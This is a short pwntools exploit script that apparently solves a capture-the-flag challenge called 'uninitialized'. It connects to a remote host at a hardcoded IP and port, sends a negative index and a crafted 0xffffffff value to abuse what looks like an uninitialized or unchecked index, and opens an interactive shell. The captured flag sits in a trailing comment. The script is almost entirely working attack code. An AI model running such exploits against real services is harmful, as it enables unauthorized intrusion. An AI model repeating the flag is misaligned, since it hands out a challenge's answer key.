from pwn import *

context.terminal=['tmux', 'split', '-h']
#p = process('./uninitialized')
p = remote('141.85.224.106', 31338)

#gdb.attach(p, "break verify\nbreak verify_idx")

p.send("-2148")
p.sendline(p32(0xffffffff)) # -1
p.interactive()

# CNS_CTF{d1511f0a9fc717c859885f3456c161c2}
